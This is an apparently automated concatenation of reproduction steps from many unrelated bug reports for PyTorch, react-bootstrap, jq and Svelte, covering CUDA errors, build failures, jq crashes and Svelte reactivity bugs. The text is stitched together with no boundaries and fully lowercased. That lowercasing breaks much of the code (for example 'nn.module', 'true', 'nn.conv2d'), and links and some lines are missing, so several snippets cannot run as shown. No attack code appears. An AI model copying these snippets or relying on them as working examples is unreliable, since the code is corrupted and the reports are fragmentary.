from models.resnet import * tr.backends.cudnn.benchmark=true class net(nn.module): def __init__(self,padding= 0): super(net, self).__init__() self.conv1 = nn.conv2d(3, 64, 3,padding=padding) self.conv2 = nn.conv2d(64, 64, 3,padding=padding) def forward(self, x): out = f.relu(self.conv1(x)) out = f.relu(self.conv2(out)) return out.sum() def jvp(outputs,variable,direction): dummy_u = variable(tr.ones_like(outputs), requires_grad=true) aux_grad_loss = tr.autograd.grad(outputs = outputs,inputs = variable, grad_outputs=dummy_u, create_graph=true,only_inputs=true) out = tr.autograd.grad(outputs= aux_grad_loss,inputs = dummy_u,grad_outputs=direction,create_graph=true,only_inputs=true)[0] return out device = 'cuda'
dist = tr.distributions.normal(tr.tensor(4.0,dtype= tr.float32, device = device), tr.tensor(0.5,dtype= tr.float32, device = device)) b_size = 128
num_iter = 100
x = dist.sample([b_size,3,32,32]) print("no padding")
net = net(padding=0).to(device) params = list(net.parameters())
directions = deepcopy(params) torch.cuda.synchronize()
starttime = datetime.now()
for k in range(num_iter): y = tr.sum(net(x)) dd = jvp(y,params,directions) torch.cuda.synchronize()
print(datetime.now() - starttime) print("with padding") net = net(padding=1).to(device)
params = list(net.parameters())
directions = deepcopy(params) torch.cuda.synchronize()
starttime = datetime.now()
for k in range(num_iter): y = tr.sum(net(x)) dd = jvp(y,params,directions)
torch.cuda.synchronize()
print(datetime.now() - starttime)
export cmake_prefix_path=${conda_prefix:-"$(dirname $(which conda))/../"}
rel_with_deb_info=1 no_caffe2_ops=1 no_cuda=1 use_fbgemm=1 time python setup.py develop
[2/1073] building cxx object third_party/ideep/mkl-dnn/src/cmakefiles/mkldnn.dir/common/utils.cpp.o
failed: third_party/ideep/mkl-dnn/src/cmakefiles/mkldnn.dir/common/utils.cpp.o /usr/lib64/ccache/c++ -dmkldnn_dll -dmkldnn_dll_exports -dmkldnn_thr=mkldnn_thr_omp -donnx_ml=1 -donnx_namespace=onnx_torch -dth_blas_mkl -duse_c11_atomics=1 -duse_mkl -d__stdc_constant_macros -d__stdc_limit_macros -i../third_party/protobuf/src -i../cmake/../third_party/benchmark/include -i../third_party/onnx -ithird_party/onnx -i../third_party/foxi -ithird_party/foxi -i../third_party/ideep/mkl-dnn/include -ithird_party/ideep/mkl-dnn/include -i../third_party/ideep/mkl-dnn/src -i../third_party/ideep/mkl-dnn/src/common -i../third_party/ideep/mkl-dnn/src/cpu -i../third_party/ideep/mkl-dnn/src/cpu/xbyak -i../third_party/ideep/mkl-dnn/src/../include -isystem third_party/gloo -isystem ../cmake/../third_party/gloo -isystem ../cmake/../third_party/googletest/googlemock/include -isystem ../cmake/../third_party/googletest/googletest/include -isystem /home/jamesreed/miniconda3/include -isystem ../third_party/gemmlowp -isystem ../third_party/neon2sse -isystem ../third_party -isystem ../cmake/../third_party/eigen -isystem /home/jamesreed/miniconda3/include/python3.7m -isystem /home/jamesreed/miniconda3/lib/python3.7/site-packages/numpy/core/include -isystem ../torch/include -wno-deprecated -fvisibility-inlines-hidden -fopenmp -std=c++11 -fvisibility-inlines-hidden -wall -wno-unknown-pragmas -werror -fvisibility=internal -march=native -mtune=native -fpic -wformat -wformat-security -fstack-protector-strong -fopenmp -wmissing-field-initializers -wno-strict-overflow -o2 -g -dndebug -fpic -dcaffe2_use_gloo -dhave_gcc_get_cpuid -duse_avx -duse_avx2 -wno-maybe-uninitialized -wno-strict-overflow -wno-error=strict-overflow -wno-tautological-compare -std=gnu++11 -md -mt third_party/ideep/mkl-dnn/src/cmakefiles/mkldnn.dir/common/utils.cpp.o -mf third_party/ideep/mkl-dnn/src/cmakefiles/mkldnn.dir/common/utils.cpp.o.d -o third_party/ideep/mkl-dnn/src/cmakefiles/mkldnn.dir/common/utils.cpp.o -c ../third_party/ideep/mkl-dnn/src/common/utils.cpp
../third_party/ideep/mkl-dnn/src/common/utils.cpp: in function nt mkldnn::impl::mkldnn_getenv(char*, const char*, int) :
../third_party/ideep/mkl-dnn/src/common/utils.cpp:50:24: error: har* strncpy(char*, const char*, size_t) output truncated before terminating nul copying as many bytes from a string as its length [-werror=stringop-truncation] strncpy(value, buffer, value_length); ~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/ideep/mkl-dnn/src/common/utils.cpp:46:34: note: length computed here value_length = strlen(buffer); ~~~~~~^~~~~~~~
cc1plus: all warnings being treated as errors
``` build works fine with `use_mkldnn=0`.
steps to reproduce the behavior: ```
import torch.nn as nn
import torch.multiprocessing as mp
import time
def test(): print("test in") layer = nn.linear(5 * 5 * 64, 64) nn.init.orthogonal_(layer.weight.data) print("test out")
processes = []
for rank in range(0, 1): p = mp.process(target=test) p.start() processes.append(p) time.sleep(0.1)
for p in processes: time.sleep(0.1) p.join()
t cc @alband @mruberry
steps to reproduce the behavior: ```python
import torch def test(batch_size): mat = torch.randn(batch_size, 12, 12) vec = torch.randn(batch_size, 12, 1) res, _ = torch.solve(vec, mat) print("cpu res: {}".format(torch.norm(torch.bmm(mat,res) - vec))) mat = mat.cuda() vec = vec.cuda() res, _ = torch.solve(vec, mat) res, _ = torch.solve(vec, mat) print("gpu res: {}".format(torch.norm(torch.bmm(mat,res) - vec))) test(batch_size=65535)
test(batch_size=65536)
it will output
cpu res: 0.07957195490598679
gpu res: 0.09418904036283493 cpu res: 0.06375715881586075
traceback (most recent call last): file "test.py", line 19, in <module> test(batch_size=65536) file "test.py", line 14, in test res, _ = torch.solve(vec, mat)
runtimeerror: cuda error: invalid configuration argument
``` if you execute multiple times like this
import torch def test(batch_size): mat = torch.randn(batch_size, 12, 12) vec = torch.randn(batch_size, 12, 1) res, _ = torch.solve(vec, mat) print("cpu res: {}".format(torch.norm(torch.bmm(mat,res) - vec))) mat = mat.cuda() vec = vec.cuda() res, _ = torch.solve(vec, mat) try: res, _ = torch.solve(vec, mat) except: pass print("gpu res: {}".format(torch.norm(torch.bmm(mat,res) - vec))) test(batch_size=65535)
test(batch_size=65536)
you will get
cpu res: 0.03482796251773834
gpu res: 0.03578644245862961 cpu res: 0.0608956404030323
gpu res: 3199.743896484375
steps to reproduce the behavior: - run test_numba_integration with numba 0.44.0
running test_numba_integration ..
[2019-06-01 01:10:22.416268]
test_active_device (__main__.testnumbaintegration)
'as_cuda_array' tensor device must match active numba context
test_array_adaptor (__main__.testnumbaintegration)
torch __cuda_array_adaptor__ exposes tensor data to numba.cuda
test_conversion_errors (__main__.testnumbaintegration)
numba properly detects array interface for tensor.tensor variants
test_cuda_array_interface (__main__.testnumbaintegration)
torch.tensor exposes __cuda_array_interface__ for cuda tensors
test_from_cuda_array_interface (__main__.testnumbaintegration)
torch.as_tensor() and torch.tensor() supports the __cuda_array_interface__ protocol
test_from_cuda_array_interface_active_device (__main__.testnumbaintegration)
torch.as_tensor() tensor device must match active numba context
test_from_cuda_array_interface_lifetime (__main__.testnumbaintegration)
torch.as_tensor(obj) tensor grabs a reference to obj so that the lifetime of obj exceeds the tensor ..
ok ======================================================================
fail: test_array_adaptor (__main__.testnumbaintegration)
torch __cuda_array_adaptor__ exposes tensor data to numba.cuda.
----------------------------------------------------------------------
traceback (most recent call last): file "test_numba_integration.py", line 123, in test_array_adaptor torch.arange(10).to(dt).numpy()
assertionerror: typeerror not raised ======================================================================
fail: test_from_cuda_array_interface_active_device (__main__.testnumbaintegration)
torch.as_tensor() tensor device must match active numba context.
----------------------------------------------------------------------
traceback (most recent call last): file "test_numba_integration.py", line 345, in test_from_cuda_array_interface_active_device torch.as_tensor(numba_ary, device=torch.device("cuda", 1))
assertionerror: runtimeerror not raised ----------------------------------------------------------------------
ran 7 tests in 2.401s failed (failures=2)
traceback (most recent call last): file "run_test_new.py", line 434, in <module> main() file "run_test_new.py", line 426, in main raise runtimeerror(message)
runtimeerror: test_numba_integration failed!
cmake_minimum_required(version 3.0 fatal_error)
project(custom_ops) find_package(torch required) add_executable(test test.cc)
# target_link_libraries(test "-l/usr/lib/pytorch -lc10 -lc10_cuda -lcaffe2 -lmklml_intel -ltorch -lshm -l/opt/cuda/targets/x86_64-linux/lib -lnvrtc -lcuda")
target_link_libraries(test "${torch_libraries}")
set_property(target test property cxx_standard 11) ``` ```
my minimum code for reproducing this bug: ```
import torch
import torch.nn as nn torch.backends.cudnn.enabled = true
x = torch.rand(65536, 1, 1).cuda()
bn = nn.batchnorm1d(1) bn.cuda()
print(y.size())
it works fine in training mode
it also works fine without the l dimension at the end for the batchnorm, as below:
import torch
import torch.nn as nn torch.backends.cudnn.enabled = true
x = torch.rand(65536, 1).cuda()
bn = nn.batchnorm1d(1) bn.cuda()
print(y.size())
environment: - pytorch version (e.g., 1.0): 1.0.1 - os (e.g., linux): linux - how you installed pytorch (`conda`, `pip`, source): conda - python version: 3.6.6 - cuda/cudnn version: cuda 10/ cudnn7.4.1 - gpu models and configuration: gtx1080ti
steps to reproduce the behavior: 1
torch.backends.cudnn.deterministic = true random.seed(1) torch.manual_seed(1) torch.cuda.manual_seed_all(1) np.random.seed(1) 2
define a module as: nn.lstm(input_size=256, hidden_size=256, num_layers=3, dropout=0.1, bidirectional=true,
training with the defined module multiple times
run the code above on single gpu.
note: you need ~10 gb on your gpu to run this example ```python
x = torch.ones(35783, 65133, device='cuda')
y = torch.randn(65133, device='cuda')
z = torch.mv(x, y)
torch.cuda.synchronize() # report asynchronous error
steps to reproduce the behavior: 1
uninstall all cuda versions, nvidia drivers
reinstall cuda 10.1, cudnn 7.5.0, nccl 2.4.2
make a fresh conda environment
`git clone --recursive `
`python setup.py install` end of the error message is as follows:
[ 44%] linking cxx executable ../../bin/c10_intrusive_ptr_test
[ 44%] built target c10_intrusive_ptr_test
[ 44%] linking cxx static library ../../../lib/libprotoc.a
[ 44%] built target libprotoc
[ 44%] linking cxx static library ../../../lib/libgloo_cuda.a
[ 44%] built target gloo_cuda
makefile:140: recipe for target 'all' failed
``` output of build.log:
torch.cholesky(torch.ones(2, 2)) # -> runtimeerror torch.cholesky(torch.ones(1, 2, 2)) # -> runtimeerror torch.cholesky(torch.ones(2, 2, device="cuda")) # -> runtimeerror torch.cholesky(torch.ones(1, 2, 2, device="cuda")) # -> tensor([[[1., 0.], [1., nan]]], device=\'cuda:0\')
run the code
it requires a small pickle file containing one single minibatch of data (replacing it by a random tensor did not reproduce the problem)
the file is linked here.
[minibatch.pkl.zip]( ```python
import torch
from torch import optim
import torch.nn as nn
from torch.nn import functional as f
import pickle as pkl torch.manual_seed(1) class decoder(nn.module): """ vae decoder """ def __init__(self, img_channels, latent_size): super(decoder, self).__init__() self.latent_size = latent_size self.img_channels = img_channels self.fc1 = nn.linear(latent_size, 1024) self.deconv1 = nn.convtranspose2d(1024, 128, 5, stride=2) self.deconv2 = nn.convtranspose2d(128, 64, 5, stride=2) self.deconv3 = nn.convtranspose2d(64, 32, 6, stride=2) self.deconv4 = nn.convtranspose2d(32, img_channels, 6, stride=2) def forward(self, x): x = f.relu(self.fc1(x)) x = x.unsqueeze(-1).unsqueeze(-1) x = f.relu(self.deconv1(x)) x = f.relu(self.deconv2(x)) x = f.relu(self.deconv3(x)) reconstruction = torch.sigmoid(self.deconv4(x)) return reconstruction torch.backends.cudnn.enabled = false cuda = torch.cuda.is_available()
device = torch.device("cuda" if cuda else "cpu") decoder = decoder(3, 32).to(device)
decoder.train()
optimizer = optim.adam(decoder.parameters()) with open('minibatch.pkl', 'rb') as f: data = pkl.load(f) for batch_idx in range(500): data = data.to(device) mu = torch.randn((32, 32), device=device) recon_batch = decoder(mu) loss = .5 * (recon_batch - data).pow(2).sum(dim=(1,2,3)).sum() optimizer.zero_grad() loss.backward() optimizer.step() if batch_idx % 20 == 0: print(f'loss: {loss.item()/len(data):.6f}')
if the line `torch.backends.cudnn.enabled = false` is not commented (and thus if i do not use cudnn), the output is ```
loss: 412.374939
loss: 105.106758
loss: 60.929550
loss: 56.290668
loss: 53.807034
loss: 51.205917
loss: 50.837688
loss: 50.152969
loss: 49.427326
loss: 49.931602
loss: 49.682564
loss: 49.036819
``` if i comment that that line (which means that i am using cudnn), the output is:
loss: 412.365082
loss: 159.593903
loss: 139.744904
loss: 180.208984
loss: 216.828827
loss: 235.451126
loss: 242.588562
loss: 243.361099
loss: 248.088272
loss: 259.658417
loss: 307.006592
loss: 329.257568
loss: 342.992310
loss: 345.325562
loss: 391.979645
loss: 403.900879
steps to reproduce the behavior: 1
run pytorch in a lambda with following whl in the requirements.txt; pillow==5.3.0
pyyaml==3.13
**
torchvision==0.2.1 2
load optional model and predict an image, this error should arise; **"error in cpuinfo: failed to parse the list of present procesors in /sys/devices/system/cpu/present"**
and you will also get a timeout from the lambda, regardless of how long timeout that is chosen; **"process exited before completing request"** no stack trace available, i only receive **"error in cpuinfo: failed to parse the list of present procesors in /sys/devices/system/cpu/present"**
and a timeout error; **"process exited before completing request"**
import torch
x = torch.randn(n*n , 2, 2).cuda()
y = torch.inverse(x)
print(y.cpu().numpy())
``` error: > ----> 1 y.cpu().numpy()
> > runtimeerror: cuda runtime error (9) : invalid configuration argument at /opt/conda/conda-bld/pytorch-nightly_1540802486426/work/aten/src/thc/thctensorcopy.cu:205
steps to reproduce the behavior: 1
clone this [repo](
download [ljspeech]( and set the path in `params.py`.
install librosa and tqdm.
`python train.py`
update your react version to 17-rc and have a page with modal and dropdown present.
launch modal and close it.
click dropdownbutton to try to show dropdown, but it doesn't appear
`npx create-react-app sandbox`
`yarn add react-bootstrap@1.0.0`
use an overlaytrigger and click on it.
go to #menu-headers
add onslideend handler to `<carousel>`
click arrow and see that method is never called.
use axe-core and test modal
go to [overlay trigger example docs]( #overlay-trigger)
observe that it describes the component to use as a "stateless function component".
yarn add react-bootstrap open react componente and import one componen the react-bootstrap.
import { container } from "react-bootstrap";
tl;dr version: go to and click on the 'react-overlays' link in the body of the page; it takes you nowhere
detailed steps a user seeking documentation might conceivably follow: 1
go to
click on 'components', to go to
click on 'utilities' in the sidebar, to go to
click on 'react overlays' in the sidebar, to go to
find the text "are built on top of components from react-overlays" in the body of the page; click on the \'react-overlays\' hyperlink in that text.
nothing happens - it's a link to the same page.
use the tabs component in a react application.
view the `nav` element of the resulting html.
just type something like this and look into browser devtools - listgroup has an id, but list items doesn't
``` <listgroup id="items"> <listgroupitem id="item1">pit</listgroupitem> <listgroupitem id="item2">john</listgroupitem> <listgroupitem id="item3">ivan</listgroupitem> </listgroup>
``` ![screenshot from 2019-06-22 12-39-14]( ## reproducable example
go to 'forms'
click on 'left-sidebar validation'
click on 'submit form' on the first validation example.
create a file, `test.tsx`, like this: ```typescript
import * as react from 'react'
import { button } from 'react-bootstrap' export default () => ( <button onclick={event => alert('hello, ' + string(event))} />
run `tsc --jsx react --noemit --strict components/test.tsx`
see error ## reproducable example notice the warning on line 8.
go to react-bootstrap docs
view any component 3
scroll the particular component and then scroll the sidebar .
server preferences
cancel
server preferences -> cancel
servers -> cancel ->
rename .app to "shadowsock space.app"
this is a expected scenario, where the input and output are separate:
echo "with separate out file"
echo \'{"foo": 1, "bar": ["baz", "qux"]}\' > in.json
jq '.foo=2' in.json > out.json
cat out.json
the output of the expected scenario will be the entire document with `foo` set to `2`
here is the output of breaking scenario, where `jq` reads in `in.json` and also pipes its output there:
echo "jq pipe to same file with set from file"
echo \'{"foo": 1, "bar": ["baz", "qux"]}\' > in.json
jq '.foo=2' in.json > in.json
cat in.json
the output of this breaking scenario is that `in.json` is simply an empty file
no `stderr` is seen either.
sample input file `test.json`: ```
[ { "key": "certificatearn", "value": "arn:aws:acm:eu-west-1:redacted:certificate/foo" }, { "key": "domainname", "value": "pattern.example.com" }
[ { "key": "certificatearn", "value": "arn:aws:acm:eu-west-1:redacted:certificate/bar" }, { "key": "domainname", "value": "baz.example.com" }
$ cat test.json | jq \'.[] | select(.value|test("pattern"))\'
segmentation fault: 11
jq -n \'"line1\ line2" | stderr | empty\'
outputs ```"line1\ line2"```
**query:** `(.[] | select(
>= 2)) |= empty`
**input:** `[1,5,3,0,7]`
**output:** `[1,3,7]`
vagrant@vagrant:~$ jq -r .foo /dev/null
vagrant@vagrant:~$ echo $?
vagrant@vagrant:~$ jq --version
def fn($str; $length): ($str|length) as $len | $len; fn("abc"; 99) # would expect to return 3, returns 99 workaround, change arg name: def fn2($str; $length_): ($str|length) as $len | $len; fn2("abc"; 99) # would expect to return 3, returns 3
$ echo \'{"x": 1.0}\' | jq -c
$ echo \'{"api_url": " "}\' | jq .api_url
segmentation fault (core dumped)
this shows the 0a in the wrong location: echo "{\\"longstring\\": \\"___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\\"}" | jq -r .longstring | hexdump | tail -2 0000160 5f5f 5f5f 5f5f 5f5f 5f5f 0a5f 000016c this is one character shorter and shows an 0a at an expected location (the end) echo "{\\"longstring\\": \\"__________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\\"}" | jq -r .longstring | hexdump | tail -2 0000160 5f5f 5f5f 5f5f 5f5f 5f5f 000a 000016b notice the `0a` is misplaced in the first example
this causes a lot of problems with data that needs to be decoded like base64 etc.
running standard command to find version: ./jq --version
just run the script.
using the example from the wiki...
$ tz=europe/rome ./jq-linux64 -cn \'now|strflocaltime("%y-%m-%dt%h:%m:%s %z")\'
"2019-05-28t17:10:54 cet" $ tz=europe/rome date +"%y-%m-%dt%h:%m:%s %z"
2019-05-28t17:10:54 cest
`date` reports, correctly, `cest` as the timezone taking dst into account
`jq` does not.
download a windows nightly.
`jq -n \'"test" | halt_error(1)\'` ```sh
$ nightly/win64/jq --version
jq-1.6-94-gaaf200f
$ nightly/win64/jq.exe -n \'"test" | halt_error(1)\' # wrong: extra "jq: error: "
jq: error: test ```
echo \'{}\' | jq input_filename "<stdin>" jq -n \'{} | input_filename\' null
% echo \'["282324313233842176"]\' | jq ".[] | tonumber"
% jq-1.5 \'map_values( tonumber? // tostring)\' <<< \'{"fish": "food", "account": "1234"}\'
{ "fish": "food", "account": 1234
% jq-1.6 \'map_values( tonumber? // tostring)\' <<< \'{"fish": "food", "account": "1234"}\'
{ "fish": "food"
```jq -n \'range(365)|("5970-03-01t01:02:03z"|strptime("%y-%m-%dt%h:%m:%sz")|mktime)* (86400 * .)|strftime("%y-%m-%dt%h:%m:%sz")\'``` ```"1970-01-01t00:00:00z"
"345615936-12-13t00:00:00z"
"691229903-11-25t00:00:00z"
"1036843870-11-05t00:00:00z"
"1382457837-10-17t00:00:00z"
"1728071804-09-28t00:00:00z"
"2073685771-09-09t00:00:00z" jq: jv.c:324: jv_array_get: assertion `jv_get_kind(j) == jv_kind_array\' failed.
program received signal sigabrt, aborted.
in raise () from /lib64/libc.so.6
#0 in raise () from /lib64/libc.so.6
#1 in abort () from /lib64/libc.so.6
#2 in __assert_fail_base () from /lib64/libc.so.6
#3 in __assert_fail () from /lib64/libc.so.6
#4 in jv_array_get (j=..., idx=idx@entry=0) at src/jv.c:333
#5 in jv2tm (a=..., tm=tm@entry= ) at src/builtin.c:1400
#6 in f_strftime (jq=<optimized out>, a=..., b=...) at src/builtin.c:1524
#7 in jq_next (jq= ) at src/execute.c:853
#8 in process (jq= , value=..., flags=<optimized out>, dumpopts=645) at src/main.c:179
#9 in main (argc=<optimized out>, argv=<optimized out>) at src/main.c:654
```jq -ncsm --arg module sodimm '{ $module, }'```
$ ansible myhost -o -m raw -u mylogin -a "ls -ll /var/www/db-backups" | jq -c
error displayed:
parse error: invalid numeric literal at line 1, column 18
this should raise a "normal error", instead it returns null.
```echo \'{}\' | jq \'(try ["a","b"] catch null) as $selected | if ($selected|length<2) then $selected[0] else ("normal error " | error) end\'```
exact same code except with halt_error instead of error raises halt_error.
```echo \'{}\' | jq \'(try ["a","b"] catch null) as $selected | if ($selected|length<2) then $selected[0] else ("halt error " | halt_error) end\'```
go to appveyor and look at the test logs
these contain lines like this
============================================================================
testsuite summary for jq 1.6-51-g9a0d5be
============================================================================
============================================================================
see ./test-suite.log
(text log)
(test page)
$ catalyst-cli zane$ cat package.json | jq -e \'.catalyst."version-check".ignore\'; echo $? null 1
but $ cat package.json | jq -e \'.catalyst."version-check".ignore | @sh\'; echo $? "null" 0
**1.5** ```
$ jq --version
jq-1.5 $ echo \'{"key1":"value1"}\' | jq -r -a .key1
``` **1.6** ```
$ jq --version
jq-1.6 $ echo \'{"key1":"value1"}\' | jq -r -a .key1
``` notice how output still contain quotes despite the `-r` flag
removing the `-a` flag produces the correct behaviour ```
$ echo \'{"key1":"value1"}\' | jq -r .key1
az account list --query '[].id' | jq '.[]'
bash input:
jq -c --argjson first 123 '[$first]' <<< '[]'
bash output:
jq: unknown option --argjson
use jq --help for help with command-line options,
or see the jq documentation at
create the file named ***z*** from the gist (this file should be 3588 characters long and shasum should report 69bc5689218d617c9cc47d4bc6f65afd9c4533c8 -- in other words, it should have no newlines at the end of the file)
create the file named ***wp/wp.jq*** from the gist run this command: jq -rr \'include "wp"; gsub("\\\\\\\ ";"\ ")|gsub("\\\\\\\ ";"\ ")|fromwp\' <z then run these commands: jq -rr \'include "wp"; gsub("\\\\\\\ ";"\ ")|gsub("\\\\\\\ ";"\ ")\' <z >x jq -rr \'include "wp"; fromwp\' <x i am thinking that these should produce the same error report
(and, just in case: i am expecting the file ***x*** to have an shasum of ac676a24f158f1afe4d84553980b2cfcea89d7fe) i am getting different error reports from jq which suggests that the string i read from file is different from the string produced by gsub()|gsub()
run it in rhel 7
get the following:
[root@sowlx212 ~]# echo \'["a","b","c","d","e"]\' | jq \'.[2:4]\'
fatal: kernel too old
`tz=america/new_york jq -n \'"2018-08-31t00:00:00z"|fromdate|todate\'`
repl: the invalid expression is on line 35 of the generated output
or just use this javascript.
$: usedvalue = (1 ?? 2) || 0;
``` while the example here just uses constants, the same behavior occurs with normal variables.
see this repl, in particular, pay attention to the css output
the css rule is not included: prepending the css rule with `:global(...)` fixes the issue - but i am hoping to scope all css within the component if possible.
i have tried many variations to try to identify which factors are necessary and sufficient conditions for this strange behavior to occur
the 1 broken behavior and various variations that seem to work fine are summarized in this [repl repro](
it appears that this strange behavior `$store2` being undefined (see `broken.svelte`) only occurs iff all of these conditions are true: <ol> <li>we use <a href=" ">destructuring assignment </a> instead of regular assignment (see <code>assignwithoutdestructure1.svelte</code>)</li> <li>reference <code>$store1</code> at all (see <code>onlyreferencestore2.svelte</code>)</li> <li>use <code>let</code> instead of <code>const</code> (see <code>const.svelte</code>)</li> <li>destructure/assign <code>store1</code> first (see <code>assignstore2first.svelte</code>)</li>
</ol> why exactly can i not use this combination of factors in my svelte component? what is the rule that i am breaking, and where is it documented?
* confirm that `article > *` does not raise warnings.
* uncomment the `article *` selector to see the correctly raised warning.
click the "dismiss" button
type something in each input box and observe the behaviour for the top two.
typing in one clears the other.
repl:
the aforementioned issue has provided a [minimal repo]( #issue-651127150) that reproduces the issue.
works:
broken:
broken: you should see an array with all ref properties filled, but for versions above 3.23.0 what you get is the following:
[{ref: div},
{ref: null}, // <-- second element is null
{ref: div}]
here's the problematic generated code: ```js
function get_each_context(ctx, list, i) { const child_ctx = ctx.slice(); child_ctx[1] = list[i].one; // this reference to one isn't rewritten to be child_ctx[1], so one is undefined // v---------v child_ctx[2] = list[i].two !== undefined ? list[i].two : add(one, 1); return child_ctx;
open [this repl](
open your browser console.
click on "increment" a few times.
click on "cause reset".
check your console
for a real life example look at [this repl](
![image](
it works in the repl just like when using the dev server:
view the warning on this repl:
first click on the button change foo in test.svelte
everything works as expected
then try to uncomment `// proxystore.foo = "bar";` in app.svelte and you will see the error `cannot read property \'foo\' of undefined`
check [this repl ]( and this other [repl]( with a simpler example
steps to reproduce: create the following svelte component ```
<script> let autofocus = true
</script> input to focus: <input {autofocus}/>
reproducible bug: based on demo: which uses `divs`
<script> import { get_current_component } from 'svelte/internal'; let a = 0; // do something to trigger a flush after half a second settimeout(() => { a = 1; }, 500); // print current component after 1 second - should give error // instead, it prints the last-updated component settimeout(() => { console.log(get_current_component()); }, 1000);
</script> <p>{a}</p>
please see here:
thanks
```
{#each arr as i}
static content
``` never outputs anything
if entries are added to the array before the node is created it *will* render those (
[repl]( 1
you'll see error message `component is undefined` in console
uncomment `happyanchor` and comment `anchor`, it works now!
use #update or and enter the string `i am` and observe that it does not respond.
in the following code, the second `#each` block works ok, and the dom is correctly updated to reflect `list` changes
that is, it is ok to modify an array's item, even if it's a primitive value, accessing thru array[index]
but the first #each will not work, because primitive values are passed by value and not by reference
the problem is that no only it doesn't work, but it breaks reactivity on the array
<script> let list = [1, 2, 3]; const changelist = (index) => list[index] *=2 $: console.log('list', list)
</script> changing item directly from inside the each block: <br />
{#each list as item} <button on:click={() => item *= 2 }>{ item }</button>
<br /><br />
changing list[index] from inside the each block using index: <br />
{#each list as item, index} <button on:click={() => list[index] *= 2 }>{ item }</button>
repl available [here](
(via
see [this repo](
with [minimal changes]( from the svelte/template
this is [my output with missing comment]( #l76-l79).
simplified version:
<div> {#if v_lookuparea} <div id="lookupareacontent" transition:slide> <div> <a href=" " target="_blank">test 1.</a> </div> <div> <a href=" " target="_blank">test 2.</a> </div> <div> <i>add_circle</i> </div> </div> {/if} <i on:click={togglelookuparea}>expand_more</i>
</div> <script>
import { slide } from "svelte/transition";
let v_lookuparea = false; function togglelookuparea(e) { v_lookuparea = !v_lookuparea;
[demo]( 1
click `tab2` button, text should be updated to `hello tab2` (can check console for store detail)
click `tab1` button again
click `tab2` button again, it now updates
### work around * go to `title.svelte`, remove `transition:fade`, rerun it
* move store.update() outside of `then()`, rerun it.
- this repl reproduces the issue:
the previous example in a repl:
change the type from `"number"` to `"text"` to see how its behavior changes
for an actual use-case (and for how i ran into this), this repl on restrictive/controlled inputs may help:
open this repl, open the console, and click the toggle button
see that an error occurs: `cannot read property '0' of undefined`.
when the child component's slot prop changes, an error is thrown as the update is communicated back to the parent
it appears that the call to `get_slot_changes` in the child component's update function is returning `undefined`.
<slot>foobar </slot> works
<slot> </slot> works
<slot></slot> works
<slot/> works
<slot> </slot> doesn't work
<slot> </slot> doesn't work
<slot> foobar </slot> doesn't work
<slot> <div title={foo}>foo</div> <div>bar</div>
to reproduce you can use this repository by rich
updating the dependencies to latest versions does not solve the issue
if the client side js takes over too fast you can disable js or throttle the network to observe the issue
the only change you need to do before building is in this file `/src/viz.svelte`
- let angle = math.pi * 2;
+ let angle = 0;
``` after building you can observe the following in `/build/viz-ssr.js`
let angle = 0;
${(v => v ? ("value" + (v === true ? "" : "=" + json.stringify(v))) : "")(angle)}>`;
``` the resulting `index.html` does not contain a value for the range input.
<input type="range" min="0" max="6.283185307179586" step="0.01" class="svelte-1qzw59f" >
the problem can be seen right in the tutorial under 'named slots' after clicking 'show me' and opening the console.
attempt to hydrate a component containing a top-level `{@html}` tag against some existing html.
* create a svelte template
* require the tailwind default config (this produce the bug):
```javascript
const { colors, boxshadow, fontfamily, fontsize, opacity,
} = require('tailwindcss/defaulttheme');
``` you can also checkout this public mr:
<svg> <text> <tspan>{foo} {bar}</tspan> </text>
**workaround**
concat the two strings in javascript
```xml <tspan>{foo+' '+bar}</tspan>
<script> let foo = [];
</script> checked: {foo} <hr> <input type='checkbox' bind:group={foo} value='a'>a<br>
<input type='checkbox' bind:group={foo} value='b'>b<br>
<input type='checkbox' bind:group={foo} value='c'>c<br>
<input type='checkbox' bind:group={foo} value='d'>d<br> <hr> <input type='checkbox' bind:group={foo} value='a'>a<br>
<input type='checkbox' bind:group={foo} value='b'>b<br>
<input type='checkbox' bind:group={foo} value='c'>c<br>
<input type='checkbox' bind:group={foo} value='d'>d<br>
[repl](
reproduces the issue minimally.
i took the `<input>`-component from [svelma]( and tweaked it a tiny bit to get it running in the repl: (broken with 3.18.1)
(broken with 3.10.1)
(working with 3.10.0)
run the repl, the bad code is commented out so it wont crash your browser:
write inline comment then press enter to write code from new line and write block comment
<script> import { of } from 'rxjs'; import { derived } from 'svelte/store'; const store1 = of('foo'); const store2 = derived(store1, _ => _); store2.subscribe()();
``` async function mytest() { let a, b; let c = await (a || b); }
``` has been outputed as ```
async function mytest() { let a, b; let c = await a || b;
<script> import { getcontext, onmount } from 'svelte'; import { get_current_component } from 'svelte/internal'; onmount(() => { console.log(get_current_component()); });
to reproduce just spread the classes named in the value of the class attribute into multiple lines, like in this repl ```html
<div class=" foo "
</div> <style> .foo { background: red; }
repl: if you download the repl, change to `generate:'ssr'` and then `console.log(app.render())`, you get ```html
<div class=" white space
">a</div> <div class="\ \\twhite\ \\tspace\ ">b</div> <div class="white\ space">c</div>
<script> $: document.title = 'foo';
<script> let arr = [false]; $: console.log(arr);
</script> <input type=checkbox bind:checked={arr[0]}>
actual value is {arr[0]}
<br>console always shows false
you can find the repl [here](
* in the latest version (3.16.7), it prints false to console
* previously it worked (printed true, because parentelement was defined):
select at least 2 times, `span` updates, `img` not.
```js <span>img id:{ item.id }</span> <img src={ item.url } alt={ item.id }>
``` **investigation** <details> <summary>investigation</summary> if `current` is `undefined`, `img_src_value =` and `img_alt_value =` are not assigned ```js
// (2:0) <nested items={ items.filter(item => item.author === value) } let:item>
function create_default_slot(ctx) {
let current; ..
p(ctx, dirty) { if ((!current || dirty & /*item*/ 128) && t2_value !== (t2_value = /*item*/ ctx[7].id + "")) set_data(t2, t2_value); if (!current || dirty & /*item*/ 128 && img.src !== (img_src_value = /*item*/ ctx[7].url)) { attr(img, "src", img_src_value); } if (!current || dirty & /*item*/ 128 && img_alt_value !== (img_alt_value = /*item*/ ctx[7].id)) { attr(img, "alt", img_alt_value); }
``` `current` condition generated in `attributewrapper` depends on `block.has_outros`
#l150 `current` assignment depends on `intro.length` and `outro.length`
#l236 here `block.has_outros` is true, but `intro.length` and `outro.length` is zero
*** `<title>` is crucial, it creates an instance of `inlinecomponentwrapper` that calls `block.add_outro()`
#l106
